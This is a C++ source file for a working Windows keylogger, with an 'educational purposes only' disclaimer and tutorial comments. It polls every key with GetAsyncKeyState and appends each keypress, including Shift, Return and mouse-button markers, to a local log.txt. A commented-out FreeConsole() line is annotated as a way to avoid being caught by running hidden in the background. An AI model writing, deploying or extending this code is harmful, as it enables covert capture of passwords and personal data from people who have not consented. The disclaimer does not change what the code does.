/*
Disclaimer:
The following keylogger code is provided strictly for educational purposes only. Unauthorized use of keyloggers or any other
form of unauthorized monitoring software is illegal and unethical. Keyloggers can capture sensitive information, such as passwords and
personal data, without the user's consent. Always ensure that you have explicit permission from the device owner before running any
monitoring software. Misuse of this code could result in serious legal consequences.
The author and distributor of this code assume no responsibility for any misuse or damage caused by this software.
Always adhere to legal and ethical guidelines when conducting security research or testing.
*/

//                                                       KEY LOGGER - C ++

#include <iostream>  //  for input and output
#include <windows.h> // for the using the Windows API
#include <fstream>   // for the file manipulation
#include <unistd.h> // for the sleep function ls
using namespace std;

/*
This project about a keylogger which made with c++ . use a function called "GetAsyncKeyState()" . this fucntion is the main thing
 we need to understand rest of all are easy . you also need to know about the Virutal key in Window API specifically about the
 codes ... . we need window.h for the function GetAsyncKeyState(). we also use fstream header to perform file manupulation.
 to learn about the key code for the windows link https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
*/

//                                                       funtion declaration
int Save(int _key, char *file);

//                                                          MAIN FUNCTION
int main()
{
    //FreeConsole(); // since you dont want to caught while using the keylogger right ..... 
                   // so this statement will make to run in the background without any console
    char i;
    while(true)
    {
        Sleep(10);
        for (size_t i = 0; i <=255; i++)
        {   
            if(GetAsyncKeyState(i)==-32767)
            {
                Save(i, "log.txt");
            }     
        }     
    }    
}


//                                                           Save function 

int Save(int _key, char *file)
{
    Sleep(10);
    cout<<_key<<endl;

    FILE *outputfile; //here the 'FILE' a structure which contains the details about file

    outputfile = fopen(file,"a+"); //opening the file inorder to write to the file in append mode at the last where the cursor left ..

    /*
     here the virutal window key code is used eg VK_SHIFT,VK_BACK,VK_LBUTTON and more...   . fprintf() is used to write to the file 
     '%c' is to specify the output is string .....   . The third argument shows the value which is written into the text file....
    */
    if(_key == VK_SHIFT) 
        fprintf(outputfile, "%s", "[SHIFT]");

    else if(_key == VK_BACK)
        fprintf(outputfile, "%s", "[BACK]");

    else if(_key == VK_LBUTTON)
        fprintf(outputfile, "%s", "[LBUTTON]");

    else if(_key == VK_RETURN)
        fprintf(outputfile, "%s", "[RETURN]");

    else if(_key == VK_ESCAPE)
        fprintf(outputfile, "%s", "[ESCAPE]");

    else if(_key == VK_RBUTTON)
        fprintf(outputfile, "%s", "[RBUTTON]");

    else if(_key == VK_CAPITAL) 
        fprintf(outputfile, "%s", "[CAPSLOCK]");
    else
        fprintf(outputfile, "%c", _key);
    
    
    fclose(outputfile);

}


/* --------------------------------------------------------  END --------------------------------------------------- */